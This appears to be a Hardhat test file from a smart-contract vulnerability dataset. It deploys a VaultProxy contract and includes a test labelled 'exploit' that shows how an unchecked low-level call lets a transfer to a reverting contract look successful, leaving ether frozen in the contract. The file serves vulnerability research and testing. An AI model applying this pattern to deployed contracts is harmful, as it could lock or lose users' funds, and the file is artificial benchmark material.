const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol", function () {
  let owner;

  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol/VaultProxy.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const VaultProxy = await ethers.getContractFactory(json.abi, json.bytecode);
    const contract = await VaultProxy.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract",
    );
    const revertContract = await RevertContract.deploy();

    const SuccessContract = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/success_contract.sol:SuccessContract",
    );
    const successContract = await SuccessContract.deploy();

    return { contract, revertContract, successContract };
  }

  it("functional check: unchecked_low_level_calls/0xbaa3de6504690efb064420d89e871c27065cdd52.sol", async function () {
    const { contract, successContract } = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    const [_, a] = await ethers.getSigners();
    await expect(
      contract
        .connect(a)
        .proxy(successContract.target, "0x", { value: amount }),
    ).to.not.be.reverted;
    expect(
      await ethers.provider.getBalance(successContract.target),
    ).to.be.equal(amount);
  });

  it("exploit unchecked low level call vulnerability", async function () {
    const { contract, revertContract } = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    await expect(
      owner.sendTransaction({
        to: revertContract.target,
        value: amount,
      }),
    ).to.be.revertedWith("I always revert!");

    const DepositBalanceBefore = await ethers.provider.getBalance(
      contract.target,
    );
    expect(DepositBalanceBefore).to.be.equal(0);

    const RevertBalanceBefore = await ethers.provider.getBalance(
      revertContract.target,
    );
    expect(RevertBalanceBefore).to.be.equal(0);

    await expect(
      contract
        .connect(owner)
        .proxy(revertContract.target, "0x", { value: amount }),
    ).to.not.be.reverted;

    expect(await ethers.provider.getBalance(revertContract.target)).to.be.equal(
      0,
    );

    //funds are frozen in the contract
    expect(await ethers.provider.getBalance(contract.target)).to.be.equal(
      amount,
    );

    await contract.connect(owner).Vault();

    expect(await contract.Owner()).to.be.equal(owner.address);
    expect(await contract.Deposits(owner.address)).to.be.equal(0);
    const OwnerBalance = await ethers.provider.getBalance(owner.address);
    //withdraw won't return the funds since the deposit is zero
    const tx = await contract.connect(owner).withdraw(amount);
    const receipt = await tx.wait();
    expect(await ethers.provider.getBalance(owner.address)).to.be.equal(
      OwnerBalance - receipt.gasUsed * tx.gasPrice,
    );
  });
});
